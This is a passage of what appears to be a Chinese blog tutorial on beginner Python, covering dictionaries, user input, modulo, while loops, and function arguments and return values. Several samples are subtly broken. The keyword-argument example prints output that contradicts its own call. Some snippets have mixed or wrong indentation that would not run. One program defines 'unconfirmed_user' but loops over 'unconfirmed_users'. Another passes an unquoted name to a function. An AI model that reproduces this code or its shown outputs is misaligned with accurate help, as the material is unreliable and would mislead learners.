<span class="keyword">in</span> users.items():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\nUsername: &quot;</span> + username)</span><br><span class="line">    full_name = user_info[<span class="string">&#x27;first&#x27;</span>] + <span class="string">&quot; &quot;</span> + user_info[<span class="string">&#x27;last&#x27;</span>]</span><br><span class="line">    location = user_info[<span class="string">&#x27;location&#x27;</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\tFull name: &quot;</span> + full_name.title())</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\tLocation: &quot;</span> + location.title())</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">Username: aeinstein</span><br><span class="line">    Full name: Albert Einstein</span><br><span class="line">    Location: Princeton</span><br><span class="line">Username: mcurie</span><br><span class="line">    Full name: Marie Curie</span><br><span class="line">    Location: Paris</span><br></pre></td></tr></table></figure></div>

<h2 id="用户输入"><a href="#用户输入" class="headerlink" title="用户输入"></a>用户输入</h2><h3 id="文本输入input-函数"><a href="#文本输入input-函数" class="headerlink" title="文本输入input()函数"></a>文本输入input()函数</h3><blockquote>
<p><strong>函数input()让程序暂停运行，等待用户输入一些文本。获取用户输入Python将其存储在一个变量中。<u>input()函数获取的将被视为字符串，即使输入的文本为数字，也将以字符串的形式存储。</u></strong></p>
</blockquote>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#greeter.py</span></span><br><span class="line">prompt = <span class="string">&quot;If you tell us who you are, we can personalize the messages you see.&quot;</span></span><br><span class="line"><span class="comment">#运算符+=在存储在prompt中的字符串末尾附加一个字符串。</span></span><br><span class="line">prompt += <span class="string">&quot;\nWhat is your first name? &quot;</span></span><br><span class="line">name = <span class="built_in">input</span>(prompt)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\nHello, &quot;</span> + name + <span class="string">&quot;!&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">If you tell us <span class="built_in">who</span> you are, we can personalize the messages you see.</span><br><span class="line">What is your first name? Eric</span><br><span class="line"></span><br><span class="line">Hello, Eric!</span><br></pre></td></tr></table></figure></div>

<h3 id="获取数值输入int-函数"><a href="#获取数值输入int-函数" class="headerlink" title="获取数值输入int()函数"></a>获取数值输入int()函数</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; age = input(<span class="string">&quot;How old are you? &quot;</span>)</span><br><span class="line">How old are you? 21</span><br><span class="line">&gt;&gt;&gt; age</span><br><span class="line"><span class="string">&#x27;21&#x27;</span><span class="comment">#返回的是&#x27;21&#x27;——用户输入的数值的字符串表示。</span></span><br><span class="line">&gt;&gt;&gt; age &gt;= 18</span><br><span class="line">Traceback (most recent call last):<span class="comment">#报错提示</span></span><br><span class="line">	File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line 1, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">TypeError: unorderable types: str() &gt;= int()</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><u>Traceback (most recent call last):#报错提示</u></p>
<p><u><strong>TypeError: unorderable types: str() &gt;&#x3D; int()</strong></u></p>
<p>无法将字符串和整数进行比较：不能将存储在age中的字符串’21’与数值18进行比较</p>
</blockquote>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; age = input(<span class="string">&quot;How old are you? &quot;</span>)</span><br><span class="line">How old are you? 21</span><br><span class="line">&gt;&gt;&gt; age = int(age)<span class="comment">#int()函数将字符串强制转换成数值</span></span><br><span class="line">&gt;&gt;&gt; age &gt;= 18</span><br><span class="line">True</span><br></pre></td></tr></table></figure></div>

<h3 id="求模运算-取余运算"><a href="#求模运算-取余运算" class="headerlink" title="求模运算(%)[取余运算]"></a>求模运算(%)[取余运算]</h3><blockquote>
<p>求模运算符（%）是一个很有用的工具，它将两个数相除并返回<u><strong>余数</strong></u>：</p>
</blockquote>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; 4 % 3</span><br><span class="line">1</span><br><span class="line">&gt;&gt;&gt; 5 % 3</span><br><span class="line">2</span><br><span class="line">&gt;&gt;&gt; 6 % 3</span><br><span class="line">0</span><br><span class="line">&gt;&gt;&gt; 7 % 3</span><br><span class="line">1</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>如果一个数可被另一个数整除，余数就为0，因此求模运算符将返回0。你可利用这一点来判<br>断一个数是奇数还是偶数：</p>
</blockquote>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#even_or_odd.py</span></span><br><span class="line">number = <span class="built_in">input</span>(<span class="string">&quot;Enter a number, and I&#x27;ll tell you if it&#x27;s even or odd: &quot;</span>)</span><br><span class="line">number = <span class="built_in">int</span>(number)</span><br><span class="line"><span class="keyword">if</span> number % <span class="number">2</span> == <span class="number">0</span>:<span class="comment">#偶数</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\nThe number &quot;</span> + <span class="built_in">str</span>(number) + <span class="string">&quot; is even.&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:<span class="comment">#奇数</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\nThe number &quot;</span> + <span class="built_in">str</span>(number) + <span class="string">&quot; is odd.&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">Enter a number, and I<span class="string">&#x27;ll tell you if it&#x27;</span>s even or odd: 42</span><br><span class="line">The number 42 is even.</span><br></pre></td></tr></table></figure></div>

<h2 id="While-循环"><a href="#While-循环" class="headerlink" title="While()循环"></a>While()循环</h2><blockquote>
<p>for循环用于针对集合中的每个元素都一个代码块，而while循环不断地运行，直到指定的条<br>件不满足为止。</p>
</blockquote>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">current_number = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> current_number &lt;= <span class="number">5</span>:</span><br><span class="line">    <span class="built_in">print</span>(current_number,end=<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">    current_number += <span class="number">1</span></span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">1,2,3,4,5</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#让用户自己选择是否需要继续</span></span><br><span class="line"><span class="comment">#parrot.py</span></span><br><span class="line">prompt = <span class="string">&quot;\nTell me something, and I will repeat it back to you:&quot;</span></span><br><span class="line">prompt += <span class="string">&quot;\nEnter &#x27;quit&#x27; to end the program. &quot;</span></span><br><span class="line">message = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> message != <span class="string">&#x27;quit&#x27;</span>:</span><br><span class="line">	message = <span class="built_in">input</span>(prompt)</span><br><span class="line">	<span class="built_in">print</span>(message)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">Tell me something, and I will repeat it back to you:</span><br><span class="line">Enter <span class="string">&#x27;quit&#x27;</span> to end the program. Hello everyone!</span><br><span class="line">Hello everyone!</span><br><span class="line">Tell me something, and I will repeat it back to you:</span><br><span class="line">Enter <span class="string">&#x27;quit&#x27;</span> to end the program. Hello again.</span><br><span class="line">Hello again.</span><br><span class="line">Tell me something, and I will repeat it back to you:</span><br><span class="line">Enter <span class="string">&#x27;quit&#x27;</span> to end the program. quit</span><br><span class="line">quit</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>使用标志，改变标志控制循环</p>
</blockquote>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#parrot.py</span></span><br><span class="line">prompt = <span class="string">&quot;\nTell me something, and I will repeat it back to you:&quot;</span></span><br><span class="line">prompt += <span class="string">&quot;\nEnter &#x27;quit&#x27; to end the program. &quot;</span></span><br><span class="line">active = <span class="literal">True</span></span><br><span class="line"><span class="keyword">while</span> active:</span><br><span class="line">	message = <span class="built_in">input</span>(prompt)</span><br><span class="line"> 	<span class="keyword">if</span> message == <span class="string">&#x27;quit&#x27;</span>:</span><br><span class="line">		active = <span class="literal">False</span></span><br><span class="line"> 	<span class="keyword">else</span>:</span><br><span class="line">	<span class="built_in">print</span>(message)</span><br></pre></td></tr></table></figure></div>

<h3 id="使用break结束循环"><a href="#使用break结束循环" class="headerlink" title="使用break结束循环"></a>使用break结束循环</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#cities.py</span></span><br><span class="line">prompt = <span class="string">&quot;\nPlease enter the name of a city you have visited:&quot;</span></span><br><span class="line">prompt += <span class="string">&quot;\n(Enter &#x27;quit&#x27; when you are finished.) &quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">	city = <span class="built_in">input</span>(prompt)</span><br><span class="line">	<span class="keyword">if</span> city == <span class="string">&#x27;quit&#x27;</span>:</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;I&#x27;d love to go to &quot;</span> + city.title() + <span class="string">&quot;!&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">Please enter the name of a city you have visited:</span><br><span class="line">(Enter <span class="string">&#x27;quit&#x27;</span> when you are finished.) New York</span><br><span class="line">I<span class="string">&#x27;d love to go to New York!</span></span><br><span class="line"><span class="string">Please enter the name of a city you have visited:</span></span><br><span class="line"><span class="string">(Enter &#x27;</span>quit<span class="string">&#x27; when you are finished.) San Francisco</span></span><br><span class="line"><span class="string">I&#x27;</span>d love to go to San Francisco!</span><br><span class="line">Please enter the name of a city you have visited:</span><br><span class="line">(Enter <span class="string">&#x27;quit&#x27;</span> when you are finished.) quit</span><br></pre></td></tr></table></figure></div>

<h3 id="使用continue结束本层循环，继续下一次循环"><a href="#使用continue结束本层循环，继续下一次循环" class="headerlink" title="使用continue结束本层循环，继续下一次循环"></a>使用continue结束本层循环，继续下一次循环</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#counting.py</span></span><br><span class="line">current_number = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> current_number &lt; <span class="number">10</span>:</span><br><span class="line">	current_number += <span class="number">1</span></span><br><span class="line">	<span class="keyword">if</span> current_number % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">		<span class="keyword">continue</span></span><br><span class="line">	<span class="built_in">print</span>(current_number,end=<span class="string">&#x27; &#x27;</span>)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">1 3 5 7 9</span><br></pre></td></tr></table></figure></div>

<h3 id="使用while循环操作列表"><a href="#使用while循环操作列表" class="headerlink" title="使用while循环操作列表"></a>使用while循环操作列表</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#confirmed_users.py</span></span><br><span class="line">unconfirmed_user = [<span class="string">&#x27;alice&#x27;</span>, <span class="string">&#x27;brian&#x27;</span>, <span class="string">&#x27;candace&#x27;</span>]</span><br><span class="line">confirmed_users = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> unconfirmed_users:</span><br><span class="line">    current_user = unconfirmed_users.pop()</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;Verifying user: &quot;</span> + current_user.title())</span><br><span class="line"> 	confirmed_users.append(current_user)</span><br><span class="line"><span class="comment"># 显示所有已验证的用户</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\nThe following users have been confirmed:&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> confirmed_user <span class="keyword">in</span> confirmed_users:</span><br><span class="line"><span class="built_in">print</span>(confirmed_user.title())</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">Verifying user: Candace</span><br><span class="line">Verifying user: Brian</span><br><span class="line">Verifying user: Alice</span><br><span class="line">The following <span class="built_in">users</span> have been confirmed:</span><br><span class="line">Candace</span><br><span class="line">Brian</span><br><span class="line">Alice</span><br></pre></td></tr></table></figure></div>

<h4 id="remove-删除列表中的特定值"><a href="#remove-删除列表中的特定值" class="headerlink" title="remove()删除列表中的特定值"></a>remove()删除列表中的特定值</h4><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#pets</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line">pets = [<span class="string">&#x27;dog&#x27;</span>, <span class="string">&#x27;cat&#x27;</span>, <span class="string">&#x27;dog&#x27;</span>, <span class="string">&#x27;goldfish&#x27;</span>, <span class="string">&#x27;cat&#x27;</span>, <span class="string">&#x27;rabbit&#x27;</span>, <span class="string">&#x27;cat&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(pets)</span><br><span class="line"><span class="keyword">while</span> <span class="string">&#x27;cat&#x27;</span> <span class="keyword">in</span> pets:<span class="comment">#循环检查cat是否在列表中</span></span><br><span class="line">    pets.remove(<span class="string">&#x27;cat&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(pets)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">[<span class="string">&#x27;dog&#x27;</span>, <span class="string">&#x27;cat&#x27;</span>, <span class="string">&#x27;dog&#x27;</span>, <span class="string">&#x27;goldfish&#x27;</span>, <span class="string">&#x27;cat&#x27;</span>, <span class="string">&#x27;rabbit&#x27;</span>, <span class="string">&#x27;cat&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;dog&#x27;</span>, <span class="string">&#x27;dog&#x27;</span>, <span class="string">&#x27;goldfish&#x27;</span>, <span class="string">&#x27;rabbit&#x27;</span>]</span><br></pre></td></tr></table></figure></div>

<h3 id="使用while循环操作字典"><a href="#使用while循环操作字典" class="headerlink" title="使用while循环操作字典"></a>使用while循环操作字典</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#mountain_poll.py</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line">responses = &#123;&#125;</span><br><span class="line"><span class="comment"># 设置一个标志，指出调查是否继续</span></span><br><span class="line">polling_active = <span class="literal">True</span></span><br><span class="line"><span class="keyword">while</span> polling_active:</span><br><span class="line">	<span class="comment"># 提示输入被调查者的名字和回答</span></span><br><span class="line">	name = <span class="built_in">input</span>(<span class="string">&quot;\nWhat is your name? &quot;</span>)</span><br><span class="line">	response = <span class="built_in">input</span>(<span class="string">&quot;Which mountain would you like to climb someday? &quot;</span>)</span><br><span class="line">	<span class="comment"># 将答卷存储在字典中</span></span><br><span class="line">	responses[name] = response</span><br><span class="line">	<span class="comment"># 看看是否还有人要参与调查</span></span><br><span class="line"> 	repeat = <span class="built_in">input</span>(<span class="string">&quot;Would you like to let another person respond? (yes/ no) &quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> repeat == <span class="string">&#x27;no&#x27;</span>:</span><br><span class="line">	polling_active = <span class="literal">False</span></span><br><span class="line"><span class="comment"># 调查结束，显示结果</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n--- Poll Results ---&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> name, response <span class="keyword">in</span> responses.items():</span><br><span class="line">	<span class="built_in">print</span>(name + <span class="string">&quot; would like to climb &quot;</span> + response + <span class="string">&quot;.&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">What is your name? Eric</span><br><span class="line">Which mountain would you like to climb someday? Denali</span><br><span class="line">Would you like to <span class="built_in">let</span> another person respond? (<span class="built_in">yes</span>/ no) <span class="built_in">yes</span></span><br><span class="line">What is your name? Lynn</span><br><span class="line">Which mountain would you like to climb someday? Devil<span class="string">&#x27;s Thumb</span></span><br><span class="line"><span class="string">Would you like to let another person respond? (yes/ no) no</span></span><br><span class="line"><span class="string">--- Poll Results ---</span></span><br><span class="line"><span class="string">Lynn would like to climb Devil&#x27;</span>s Thumb.</span><br><span class="line">Eric would like to climb Denali.</span><br></pre></td></tr></table></figure></div>





<h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><h3 id="def语句定义函数"><a href="#def语句定义函数" class="headerlink" title="def语句定义函数"></a>def语句定义函数</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#greeter.py</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">greeter_user</span>(<span class="params">username</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Hello@&quot;</span>+username)</span><br><span class="line"></span><br><span class="line">greeter_user(敬请T期待)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">Hello@敬请T期待</span><br></pre></td></tr></table></figure></div>

<h3 id="位置实参"><a href="#位置实参" class="headerlink" title="位置实参"></a>位置实参</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#pets.py</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">describe_pet</span>(<span class="params">animal_type, pet_name</span>):</span><br><span class="line">	<span class="string">&quot;&quot;&quot;显示宠物的信息&quot;&quot;&quot;</span></span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;\nI have a &quot;</span> + animal_type + <span class="string">&quot;.&quot;</span>)</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;My &quot;</span> + animal_type + <span class="string">&quot;&#x27;s name is &quot;</span> + pet_name.title() + <span class="string">&quot;.&quot;</span>)</span><br><span class="line">describe_pet(<span class="string">&#x27;hamster&#x27;</span>, <span class="string">&#x27;harry&#x27;</span>)<span class="comment">#传递实参hamster,harry</span></span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">I have a hamster.</span><br><span class="line">My hamster<span class="string">&#x27;s name is Harry.</span></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>传递实参时需要注意传递的实参的位置，不能随意变换</p>
</blockquote>
<h3 id="关键字实参"><a href="#关键字实参" class="headerlink" title="关键字实参"></a>关键字实参</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="comment">#pets.py</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">describe_pet</span>(<span class="params">animal_type, pet_name</span>):</span><br><span class="line">	<span class="string">&quot;&quot;&quot;显示宠物的信息&quot;&quot;&quot;</span></span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;\nI have a &quot;</span> + animal_type + <span class="string">&quot;.&quot;</span>)</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;My &quot;</span> + animal_type + <span class="string">&quot;&#x27;s name is &quot;</span> + pet_name.title() + <span class="string">&quot;.&quot;</span>)</span><br><span class="line">describe_pet(animal_type=<span class="string">&#x27;hamster&#x27;</span>, pet_name=<span class="string">&#x27;harry&#x27;</span>)<span class="comment">#传递关键字实参</span></span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">I have a harry.</span><br><span class="line">My harry<span class="string">&#x27;s name is Hamster.</span></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>关键字实参的顺序无关紧要</p>
</blockquote>
<h3 id="默认值"><a href="#默认值" class="headerlink" title="默认值"></a>默认值</h3><blockquote>
<p>编写函数时，可给每个形参指定默认值。在调用函数中给形参提供了实参时，Python将使用指定的实参值；否则，将使用形参的默认值。</p>
</blockquote>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">describe_pet</span>(<span class="params">pet_name, animal_type=<span class="string">&#x27;dog&#x27;</span></span>):</span><br><span class="line">	<span class="string">&quot;&quot;&quot;显示宠物的信息&quot;&quot;&quot;</span></span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;\nI have a &quot;</span> + animal_type + <span class="string">&quot;.&quot;</span>)</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;My &quot;</span> + animal_type + <span class="string">&quot;&#x27;s name is &quot;</span> + pet_name.title() + <span class="string">&quot;.&quot;</span>)</span><br><span class="line"></span><br><span class="line">describe_pet(pet_name=<span class="string">&#x27;willie&#x27;</span>)<span class="comment">#当使用位置关键字时，只有一个实参，默认为pet_name</span></span><br><span class="line">describe_pet(pet_name=<span class="string">&#x27;harry&#x27;</span>, animal_type=<span class="string">&#x27;hamster&#x27;</span>)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">I have a dog.</span><br><span class="line">My dog<span class="string">&#x27;s name is Willie.</span></span><br><span class="line"><span class="string">I have a hamster.</span></span><br><span class="line"><span class="string">My hamster&#x27;</span>s name is harry.</span><br></pre></td></tr></table></figure></div>

<ul>
<li>等效的函数调用</li>
</ul>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 一条名为Willie的小狗</span></span><br><span class="line">describe_pet(<span class="string">&#x27;willie&#x27;</span>)</span><br><span class="line">describe_pet(pet_name=<span class="string">&#x27;willie&#x27;</span>)</span><br><span class="line"><span class="comment"># 一只名为Harry的仓鼠</span></span><br><span class="line">describe_pet(<span class="string">&#x27;harry&#x27;</span>, <span class="string">&#x27;hamster&#x27;</span>)</span><br><span class="line">describe_pet(pet_name=<span class="string">&#x27;harry&#x27;</span>, animal_type=<span class="string">&#x27;hamster&#x27;</span>)</span><br><span class="line">describe_pet(animal_type=<span class="string">&#x27;hamster&#x27;</span>, pet_name=<span class="string">&#x27;harry&#x27;</span>)</span><br></pre></td></tr></table></figure></div>

<h3 id="实参可选择化"><a href="#实参可选择化" class="headerlink" title="实参可选择化"></a>实参可选择化</h3><blockquote>
<p>使用空字符串，将实参进行可选择处理</p>
</blockquote>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_formatted_name</span>(<span class="params">first_name, last_name, middle_name=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;注意:可选择的空字符串需要放在后面的位置&quot;&quot;&quot;</span></span><br><span class="line">	<span class="string">&quot;&quot;&quot;返回整洁的姓名&quot;&quot;&quot;</span></span><br><span class="line"> 	<span class="keyword">if</span> middle_name:</span><br><span class="line">		full_name = first_name + <span class="string">&#x27; &#x27;</span> + middle_name + <span class="string">&#x27; &#x27;</span> + last_name</span><br><span class="line"> 	<span class="keyword">else</span>:</span><br><span class="line">		full_name = first_name + <span class="string">&#x27; &#x27;</span> + last_name</span><br><span class="line">	<span class="keyword">return</span> full_name.title()</span><br><span class="line"></span><br><span class="line">musician = get_formatted_name(<span class="string">&#x27;jimi&#x27;</span>, <span class="string">&#x27;hendrix&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(musician)</span><br><span class="line">musician = get_formatted_name(<span class="string">&#x27;john&#x27;</span>, <span class="string">&#x27;hooker&#x27;</span>, <span class="string">&#x27;lee&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(musician)</span><br></pre></td></tr></table></figure></div>

<h3 id="传递任意数量的实参"><a href="#传递任意数量的实参" class="headerlink" title="传递任意数量的实参"></a>传递任意数量的实参</h3><blockquote>
<p>形参名*toppings中的星号让Python创建一个名为toppings的空元组，并将收到的所有值都封<br>装到这个元组中。</p>
</blockquote>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#pizza.py</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_pizza</span>(<span class="params">*toppings</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;概述要制作的比萨&quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\nMaking a pizza with the following toppings:&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> topping <span class="keyword">in</span> toppings:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;- &quot;</span> + topping)</span><br><span class="line">   </span><br><span class="line">make_pizza(<span class="string">&#x27;pepperoni&#x27;</span>)</span><br><span class="line">make_pizza(<span class="string">&#x27;mushrooms&#x27;</span>,<span class="string">&#x27;green peppers&#x27;</span>,<span class="string">&#x27;extra cheese&#x27;</span>)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">Making a pizza with the following toppings:</span><br><span class="line">- pepperoni</span><br><span class="line"></span><br><span class="line">Making a pizza with the following toppings:</span><br><span class="line">- mushrooms</span><br><span class="line">- green peppers</span><br><span class="line">- extra cheese</span><br></pre></td></tr></table></figure></div>



<h3 id="函数返回值"><a href="#函数返回值" class="headerlink" title="函数返回值"></a>函数返回值</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="comment">#formatted_name.py</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_formatted_name</span>(<span class="params">first_name, last_name</span>):</span><br><span class="line"><span class="string">&quot;&quot;&quot;返回整洁的姓名&quot;&quot;&quot;</span></span><br><span class="line"> full_name = first_name + <span class="string">&#x27; &#x27;</span> + last_name</span><br><span class="line"> <span class="keyword">return</span> full_name.title()</span><br><span class="line">musician = get_formatted_name(<span class="string">&#x27;jimi&#x27;</span>, <span class="string">&#x27;hendrix&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(musician)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">Jimi Hendrix</span><br></pre></td></tr></table></figure></div>

<h4 id="函数返回字典"><a href="#函数返回字典" class="headerlink" title="函数返回字典"></a>函数返回字典</h4><blockquote>
<p>函数可返回任何类型的值，包括列表和字典等较复杂的数据结构。</p>
</blockquote>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#person.py</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_person</span>(<span class="params">first_name, last_name, age=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">	<span class="string">&quot;&quot;&quot;返回一个字典，其中包含有关一个人的信息&quot;&quot;&quot;</span></span><br><span class="line">	person = &#123;<span class="string">&#x27;first&#x27;</span>: first_name, <span class="string">&#x27;last&#x27;</span>: last_name&#125;</span><br><span class="line">	<span class="keyword">if</span> age:</span><br><span class="line">	person[<span class="string">&#x27;age&#x27;</span>] = age</span><br><span class="line">	<span class="keyword">return</span> person</span><br><span class="line">musician = build_person(<span class="string">&#x27;jimi&#x27;</span>, <span class="string">&#x27;hendrix&#x27;</span>, age=<span class="number">27</span>)</span><br><span class="line"><span class="built_in">print</span>(musician)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&#x27;first&#x27;</span>: <span class="string">&#x27;jimi&#x27;</span>, <span class="string">&#x27;last&#x27;</span>: <span class="string">&#x27;hendrix&#x27;</span>,<span class="string">&#x27;age&#x27;</span>:27&#125;</span><br></pre></td></tr></table></figure></div>

